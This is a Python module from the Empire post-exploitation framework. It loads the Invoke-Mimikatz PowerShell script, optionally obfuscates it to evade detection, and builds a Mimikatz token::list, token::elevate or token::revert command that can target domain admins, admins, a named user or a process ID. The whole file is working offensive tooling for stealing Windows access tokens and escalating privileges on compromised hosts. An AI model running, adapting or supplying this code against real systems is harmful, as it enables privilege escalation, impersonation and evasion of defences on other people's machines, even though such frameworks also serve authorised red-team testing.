from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if main_menu.obfuscate:
            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
            if pathlib.Path(obfuscated_module_source).is_file():
                module_source = obfuscated_module_source

        try:
            with open(module_source, 'r') as f:
                module_code = f.read()
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
                                         obfuscationCommand=main_menu.obfuscateCommand)
        else:
            script = module_code

        list_tokens = params['list']
        elevate = params['elevate']
        revert = params['revert']
        admin = params['admin']
        domainadmin = params['domainadmin']
        user = params['user']
        processid = params['id']

        script = module_code

        script_end = "Invoke-Mimikatz -Command "

        if revert.lower() == "true":
            script_end += "'\"token::revert"
        else:
            if list_tokens.lower() == "true":
                script_end += "'\"token::list"
            elif elevate.lower() == "true":
                script_end += "'\"token::elevate"
            else:
                return handle_error_message("[!] list, elevate, or revert must be specified!")

            if domainadmin.lower() == "true":
                script_end += " /domainadmin"
            elif admin.lower() == "true":
                script_end += " /admin"
            elif user.lower() != "":
                script_end += " /user:" + str(user)
            elif processid.lower() != "":
                script_end += " /id:" + str(processid)

        script_end += "\"';"

        if main_menu.obfuscate:
            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
